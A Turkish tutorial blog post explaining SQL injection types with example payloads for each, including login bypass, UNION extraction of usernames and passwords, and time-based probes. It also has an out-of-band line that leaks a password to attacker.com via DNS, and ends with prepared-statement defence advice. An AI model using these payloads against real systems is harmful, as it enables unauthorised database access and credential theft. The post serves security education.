Web güvenliğinin en köklü ve en tehlikeli açıklarından biri olan **SQL Injection (SQLi)**, modern framework'lere rağmen hala birçok sistemde karşımıza çıkmaktadır. Bu yazıda SQLi'nın mantığını, türlerini ve her türe ait örnek saldırı vektörlerini (payload) inceleyeceğiz.

## SQL Injection (SQLi) Nedir?

SQL Injection, bir uygulamanın veritabanı sorgularına (SQL) müdahale edilmesine olanak tanıyan bir güvenlik açığıdır. Saldırgan, uygulamanın beklediği girdi yerine zararlı SQL komutları göndererek veritabanını manipüle eder.

**Bu zafiyet sayesinde saldırganlar:**
- Yetkisiz giriş yapabilir (Authentication Bypass).
- Veritabanındaki hassas verileri okuyabilir.
- Verileri değiştirebilir veya silebilir.
- Bazı durumlarda sunucuda komut çalıştırabilir.

## Nasıl Çalışır?

Normal şartlarda bir web sitesi sizden kullanıcı adı istediğinde arka planda şöyle bir sorgu çalışır:

```sql
SELECT * FROM users WHERE username = 'kullanici_girdisi';
Eğer geliştirici bu girdiyi filtrelemezse, saldırgan admin' -- gibi bir ifade girdiğinde sorgu şuna dönüşür:
SELECT * FROM users WHERE username = 'admin' --';
Buradaki -- ifadesi (MySQL'de) sorgunun geri kalanını yorum satırı yapar ve şifre kontrolü devre dışı kalarak sisteme admin olarak giriş yapılır.
SQL Injection Türleri ve Payload Örnekleri
SQLi temelde üç ana kategoriye ayrılır: In-band, Inferential (Blind) ve Out-of-band.

1. In-band SQLi (Klasik)
Saldırganın veriyi aynı kanal üzerinden (örneğin web sayfasında dönen hata mesajı veya tablo içinde) görebildiği en yaygın türdür.

A. Error-Based (Hata Temelli)
Veritabanının verdiği hata mesajlarını kullanarak veritabanı yapısını çözmeye çalışır.

Örnek Payloadlar:
' OR 1=1; --
' OR '1'='1
' OR 1=1 LIMIT 1; --

B. Union-Based
UNION operatörünü kullanarak orijinal sorgunun sonucuna kendi istediğimiz sorgunun sonucunu ekleriz. Bu sayede veritabanından veri çekebiliriz.

Örnek Payloadlar: Kolon sayısını tespit etmek için:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- 
-- (Hata alana kadar sayı artırılır)
Veri çekmek için:
' UNION SELECT null, username, password FROM users--
' UNION SELECT 1, version(), database()--
2. Inferential (Blind) SQLi
Uygulama veritabanı hatalarını veya veriyi ekrana yansıtmaz. Saldırgan veritabanına "Evet/Hayır" soruları sorarak veya zaman gecikmeleri yaratarak veriyi harf harf çeker.

A. Boolean-Based (Mantıksal)
Sorgunun sonucuna göre sayfanın içeriği değişiyorsa kullanılır.

Örnek Payloadlar: Eğer sayfa normal açılıyorsa 1=1 (True), içerik kayboluyorsa 1=0 (False) mantığı:
' AND 1=1--   (Sayfa içeriği normal)
' AND 1=0--   (Sayfa içeriği boş veya farklı)
Kullanıcı adının ilk harfini tahmin etme:
' AND SUBSTRING((SELECT version()),1,1) = '5'--
B. Time-Based (Zaman Temelli)
Sayfa tepkisiz kalsa bile, veritabanını belirli bir süre uyutarak (sleep) sorgunun başarılı olup olmadığını anlarız.

Örnek Payloadlar: MySQL:

SQL

' AND SLEEP(5)--
' UNION SELECT SLEEP(5)--
PostgreSQL:

SQL

'; pg_sleep(5)--
3. Out-of-Band (OOB) SQLi
Saldırganın sunucudan yanıt alamadığı ve veritabanı özelliklerini (örneğin DNS veya HTTP istekleri) kullanarak veriyi dışarıdaki bir sunucuya gönderdiği nadir bir türdür.

Örnek Payload (Oracle/MySQL): Saldırgan kendi sunucusuna DNS isteği attırarak veriyi URL içinde taşır.

SQL

'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\foobar'));
Nasıl Korunulur?
SQL Injection'dan korunmanın en etkili yolu Prepared Statements (Hazırlanmış Sorgular) kullanmaktır. Kullanıcı girdisi asla doğrudan SQL sorgusuna string concatenation (metin birleştirme) ile eklenmemelidir.

Güvensiz (Node.js Örneği):

JavaScript

// ASLA YAPMAYIN
const query = "SELECT * FROM users WHERE id = " + userId;
Güvenli (Prepared Statement):

JavaScript

// DOĞRUSU
db.query("SELECT * FROM users WHERE id = ?", [userId]);
Yasal Uyarı: Bu bilgiler tamamen eğitim amaçlıdır. Sadece izinli olduğunuz sistemlerde (örneğin kendi laboratuvar ortamınızda veya CTF'lerde) test yapınız.
